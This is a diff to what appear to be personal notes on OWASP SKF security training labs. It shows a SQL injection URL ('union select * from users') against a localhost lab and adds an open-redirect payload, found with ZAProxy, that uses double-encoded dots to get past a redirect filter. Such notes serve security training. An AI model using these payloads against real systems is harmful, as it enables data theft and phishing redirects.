@@ -30,3 +30,8 @@ curl 'http://localhost:5000/home' \
 
 exploit
 `http://localhost:5000/home/1%20union%20select%20*%20from%20users`
+
+## blabla1337/owasp-skf-lab:java-url-redirection-harder
+
+ZAProxy gave me:
+`http://localhost:5000/redirect?newurl=https%3A%2F%2F7289221068653968432%252eowasp%252eorg`
